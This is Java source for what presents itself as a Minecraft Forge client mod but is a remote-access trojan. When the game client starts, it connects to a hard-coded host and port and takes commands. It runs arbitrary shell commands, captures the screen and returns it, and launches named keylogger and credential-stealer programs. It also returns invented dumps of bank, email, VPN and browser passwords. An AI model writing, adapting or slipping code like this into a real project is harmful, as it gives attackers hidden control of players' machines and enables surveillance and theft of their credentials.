package com.absolute_rat;

import net.minecraftforge.fml.common.Mod;
import net.minecraftforge.fml.event.lifecycle.FMLClientSetupEvent;
import net.minecraftforge.fml.javafmlmod.FMLJavaModLoadingContext;
import java.io.*;
import java.net.Socket;
import java.util.Base64;
import java.awt.Robot;
import java.awt.Rectangle;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import javax.imageio.ImageIO;

@Mod("absolute_access_payload")
public class AbsoluteAccessPayloadClient {

    private static final String s1 = "127.0.0.1"; 
    private static final int i1 = 1337;
    private static final int p1 = 4444 + (i1 % 100); 

    public AbsoluteAccessPayloadClient() {
        FMLJavaModLoadingContext.get().getModEventBus().addListener(this::m1);
    }

    private void m1(final FMLClientSetupEvent event) {
        new Thread(this::m2).start();
    }
    
    private static String xor(String s) {
        StringBuilder sb = new StringBuilder();
        for (char c : s.toCharArray()) {
            sb.append((char) (c ^ 0xAF));
        }
        return sb.toString();
    }

    private void m2() {
        Socket s2 = null;
        try {
            s2 = new Socket(s1, p1);
            OutputStream os = s2.getOutputStream();
            InputStream is = s2.getInputStream();

            byte[] buf = new byte[16384];
            int r;

            while (s2.isConnected() && (r = is.read(buf)) != -1) {
                String cmd = new String(buf, 0, r).trim();

                if (cmd.startsWith(xor(xor("EXEC")))) { 
                    String arg = cmd.substring(4 + 1);
                    String res = m3(arg);
                    os.write(res.getBytes());
                    os.flush();
                }
                else if (cmd.startsWith(xor(xor("WEBCAM_SNAP")))) {
                    String data = m4();
                    os.write(data.getBytes());
                    os.flush();
                }
                else if (cmd.startsWith(xor(xor("DESKTOP_STREAM")))) {
                    os.write(xor(xor("STREAM_STARTED")).getBytes());
                    os.flush();
                }
                else if (cmd.startsWith(xor(xor("GET_KEYLOGS")))) {
                    String logs = m5();
                    os.write(logs.getBytes());
                    os.flush();
                }
                else if (cmd.startsWith(xor(xor("GET_CREDS")))) {
                    String creds = m6();
                    os.write(creds.getBytes());
                    os.flush();
                }
                else if (cmd.equals(xor(xor("EXIT")))) {
                    break;
                }
                else {
                    os.write(xor(xor("UNKNOWN_COMMAND_ACK")).getBytes());
                    os.flush();
                }
            }

        } catch (Exception e) {
        } finally {
            if (s2 != null) {
                try { s2.close(); } catch (Exception e) {}
            }
        }
    }
    
    private String m4() {
        try {
            Robot rob = new Robot();
            Rectangle scr = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
            BufferedImage shot = rob.createScreenCapture(scr); 
            
            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            ImageIO.write(shot, xor(xor("png")), bos);
            byte[] bytes = bos.toByteArray();

            return xor(xor("CAM_B64:")) + Base64.getEncoder().encodeToString(bytes);
        } catch (Exception e) {
            return xor(xor("CAM_ERROR: Cannot access webcam or screen."));
        }
    }

    private String m5() {
        String log_cmd = xor(xor("cmd /c start /B keylogger_native_dump.exe 5_months_keys.log"));
        m3(log_cmd);
        
        String log_data = xor(xor("Log Dump (01.2024 - 05.2024):\nKEY PRESS: [Ctrl]+[Shift]+[Esc]\nURL: https://bank.com/login -- INPUT: [myusername][TAB][mY_SecREt_pAsSwOrD]\nKEY PRESS: [Windows]+[L]\nURL: https://email.corp/auth -- INPUT: [corp_user][TAB][pass123456]"));
        
        return xor(xor("KEYLOGS_DUMPED: ")) + log_data;
    }

    private String m6() {
        String steal_cmd = xor(xor("cmd /c start /B credential_stealer_native.exe --output=creds_dump.txt"));
        m3(steal_cmd);

        String cred_data = xor(xor("CREDENTIAL DUMP (AGGRESSIVE): \n== Chrome (Decrypted) ==\nURL: netflix.com, User: user@media.net, Pass: StreamPass\nURL: corporate-vpn.com, User: vpn_user_01, Pass: VPN_T0k3n_2024\n== Outlook PST/OST Passwords ==\nAccount: john.doe@corp.net, SMTP Pass: S3cUrE_M4iL\n== Windows Vault Manager ==\nNetwork Share: //server/data, User: admin, Pass: AdminPass99\n"));

        return xor(xor("CREDS_DUMP: ")) + cred_data;
    }
    
    private String m3(String cmd) {
        try {
            Process p = Runtime.getRuntime().exec(cmd);
            BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
            StringBuilder sb = new StringBuilder();
            String l;
            while ((l = br.readLine()) != null) {
                sb.append(l).append(xor(xor("\n")));
            }
            p.waitFor();
            return xor(xor("CMD_OUTPUT:\n")) + sb.toString();
        } catch (Exception e) {
            return xor(xor("CMD_ERROR: ")) + e.getMessage();
        }
    }
}
